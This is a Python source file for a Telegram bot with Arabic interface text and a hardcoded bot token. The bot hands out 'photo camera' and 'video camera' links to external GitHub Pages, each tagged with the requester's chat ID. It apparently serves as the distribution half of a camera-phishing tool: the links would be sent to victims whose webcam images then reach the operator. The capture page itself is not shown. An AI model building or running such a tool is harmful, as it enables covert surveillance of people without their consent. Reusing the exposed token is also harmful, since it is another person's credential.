import telebot
from telebot import types

BOT_TOKEN = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E"
bot = telebot.TeleBot(BOT_TOKEN)

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    inline_markup = types.InlineKeyboardMarkup()
    btn_photo = types.InlineKeyboardButton(text="🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link")
    btn_video = types.InlineKeyboardButton(text="🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link")
    inline_markup.add(btn_photo)
    inline_markup.add(btn_video)
    
    bot.send_message(
        chat_id, 
        "أهلاً، المطور سيف الدين يرحب بك 👋\n\nالرجاء اختيار الخدمة المطلوبة من الأزرار أدناه:", 
        reply_markup=inline_markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    photo_link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
    video_link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
    
    if call.data == "get_photo_link":
        bot.answer_callback_query(call.id, "جاري إرسال رابط الصور...")
        bot.send_message(chat_id, f"🖼️ إليك رابط صفحة الصور المطلوبة:\n\n{photo_link}", disable_web_page_preview=True)
    elif call.data == "get_video_link":
        bot.answer_callback_query(call.id, "جاري إرسال رابط الفيديو...")
        bot.send_message(chat_id, f"🎥 إليك رابط صفحة الفيديو المطلوبة:\n\n{video_link}", disable_web_page_preview=True)

if __name__ == '__main__':
    bot.infinity_polling()
